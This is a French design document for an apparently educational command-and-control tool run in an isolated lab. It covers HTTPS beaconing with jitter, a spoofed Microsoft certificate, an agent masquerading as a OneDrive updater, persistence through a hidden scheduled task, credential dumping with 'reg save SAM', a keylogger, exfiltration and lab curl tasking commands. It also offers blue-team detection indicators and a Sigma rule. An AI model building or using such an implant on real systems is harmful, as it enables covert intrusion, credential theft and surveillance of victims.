# VIR-25 — Design Architecture C2

**Auteur :** Deniz Ok
**Date :** 2026-09-17
**MITRE :** T1071 — Application Layer Protocol / T1573.002 — Encrypted Channel: Asymmetric Cryptography

---

## Ce que ça fait

Ce document décrit l'architecture complète de **s0P0wn3d**, un outil C2 (Command & Control)
pédagogique composé de deux parties qui communiquent via HTTPS.

---

## Vue d'ensemble

```
┌─────────────────────────────────────────────────────────────────────┐
│  HOST — Machine Deniz (192.168.56.112)                              │
│                                                                     │
│  ┌──────────────────────────────────┐                               │
│  │         server/main.py           │  Flask + TLS (port 443)       │
│  │                                  │                               │
│  │  POST /beacon  ← check-in agent  │                               │
│  │  POST /result  ← résultats       │                               │
│  │  POST /task    → ordres operator │                               │
│  │  GET  /agents  → liste agents    │                               │
│  └──────────────┬───────────────────┘                               │
│                 │ HTTPS (TLS 1.2+, cert auto-signé                  │
│                 │ CN=update.microsoft.com)                          │
└─────────────────┼───────────────────────────────────────────────────┘
                  │  host-only network 192.168.56.0/24
                  │  (jamais exposé sur le réseau réel)
┌─────────────────┼───────────────────────────────────────────────────┐
│  VM CIBLE — Windows 11 Enterprise (192.168.56.111)                  │
│                 │                                                   │
│  ┌──────────────▼───────────────────┐                               │
│  │         agent/beacon.py          │  boucle polling toutes 5s     │
│  │                                  │  + jitter ±2s (anti-détection)│
│  │  1. POST /beacon → reçoit tasks  │                               │
│  │  2. dispatch vers module         │                               │
│  │  3. POST /result → envoie output │                               │
│  └──────────────────────────────────┘                               │
│                                                                     │
│  Emplacement physique sur la VM :                                   │
│  C:\Users\<user>\AppData\Local\Microsoft\OneDrive\                 │
│      OneDriveUpdaterService.exe  ← beacon (masquerade T1036.005)   │
│                                                                     │
│  Scheduled Task : "OneDrive Updater Service"                        │
│      Trigger : logon (tout utilisateur) — Hidden: Yes              │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Flux de communication détaillé

### 1. Check-in (toutes les 5 secondes ± jitter)

```
Agent → Serveur
POST /beacon
Content-Type: application/json
{"id": "agent_mac_id"}

Serveur → Agent
{"tasks": [{"id": "t1", "cmd": "shell", "command": "whoami"}]}
```

Si aucune tâche en attente, le serveur répond `{"tasks": []}` et l'agent se rendort.

### 2. Exécution + résultat

```
Agent → Serveur
POST /result
{"id": "agent_mac_id", "task_id": "t1", "output": "NT AUTHORITY\\SYSTEM"}
```

### 3. L'opérateur envoie un ordre

```
Opérateur → Serveur (depuis le host)
POST /task
{"id": "agent_mac_id", "task": {"cmd": "shell", "command": "ipconfig /all"}}
```

---

## Composants et fichiers

```
s0P0wn3d/
│
├── server/                  ← tourne sur le HOST
│   ├── main.py              ← démarre Flask + TLS sur 0.0.0.0:443
│   ├── api/routes.py        ← /beacon /result /task /agents
│   └── modules/             ← traitement côté serveur (parse, stockage)
│       ├── shell.py         ← parse output shell
│       ├── creds.py         ← stocke les credentials reçus
│       ├── keylog.py        ← accumule les frappes reçues
│       ├── loot.py          ← sauvegarde les fichiers exfiltrés
│       └── ...
│
├── agent/                   ← tourne sur la VM CIBLE
│   ├── beacon.py            ← boucle C2 + dispatch
│   └── modules/             ← exécution côté cible
│       ├── shell.py         ← subprocess.run()
│       ├── persistence.py   ← scheduled task OneDrive
│       ├── creds.py         ← reg save SAM/SYSTEM
│       ├── keylog.py        ← pynput listener
│       └── ...
│
├── scripts/gen_cert.py      ← génère cert.pem + key.pem (RSA-2048)
└── certs/                   ← cert.pem + key.pem (dans .gitignore)
```

---

## Choix techniques justifiés

| Décision | Raison |
|---|---|
| HTTPS port 443 | Trafic indiscernable d'une mise à jour Windows légitime |
| Pull (beacon poll) | Pas de connexion entrante sur la VM — bypasse les firewalls |
| Jitter ±2s | Évite les patterns de trafic régulier détectables par un SIEM |
| Cert CN=update.microsoft.com | Légitime aux yeux d'un analyste qui survole les logs TLS |
| Masquerade OneDrive | OneDrive tourne déjà au démarrage sur la VM, beacon s'y noie |
| Python pur (pas Metasploit) | Contrôle total du code, apprentissage des mécanismes bas niveau |

---

## Mapping MITRE ATT&CK

| Technique | ID | Composant concerné |
|---|---|---|
| Application Layer Protocol: Web Protocols | T1071.001 | Canal HTTPS beacon ↔ serveur |
| Encrypted Channel: Asymmetric Cryptography | T1573.002 | TLS RSA-2048 sur toutes les comms |
| Masquerading: Match Legitimate Name | T1036.005 | beacon → OneDriveUpdaterService.exe |
| Scheduled Task/Job: Scheduled Task | T1053.005 | persistence au logon |
| Command and Scripting Interpreter | T1059 | module shell via subprocess |

---

## Blue team — détection

| Indicateur | Outil de détection |
|---|---|
| Connexions HTTPS sortantes régulières vers 192.168.56.112 toutes les ~5s | Wireshark / Zeek — filtre `ip.dst == 192.168.56.112 && tls` |
| Certificat TLS auto-signé avec CN=update.microsoft.com (issuer = subject) | Wireshark — `tls.handshake.certificate` → vérifier l'issuer |
| Processus `OneDriveUpdaterService.exe` avec parent inhabituel | Windows Event 4688 — surveiller le PPID |
| Scheduled Task nommée "OneDrive Updater Service" créée par un utilisateur | Event 4698 — création de scheduled task |
| `reg save HKLM\SAM` dans les logs de commandes | Event 4688 + Sysmon Event 1 — command line contient `reg save` |

**Sigma rule (détection scheduled task suspecte) :**
```yaml
title: Scheduled Task OneDrive Masquerade
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4698
    TaskName|contains: 'OneDrive Updater'
  condition: selection
level: high
```

---

## Comment tester (lab uniquement)

```bash
# 1. Générer les certificats
python scripts/gen_cert.py

# 2. Démarrer le serveur sur le host
python server/main.py

# 3. Lancer le beacon sur la VM (depuis PowerShell admin)
python agent\beacon.py

# 4. Vérifier le check-in depuis le host
curl -k https://192.168.56.112/agents

# 5. Envoyer une commande
curl -k -X POST https://192.168.56.112/task \
  -H "Content-Type: application/json" \
  -d '{"id": "<agent_id>", "task": {"cmd": "shell", "command": "whoami"}}'
```
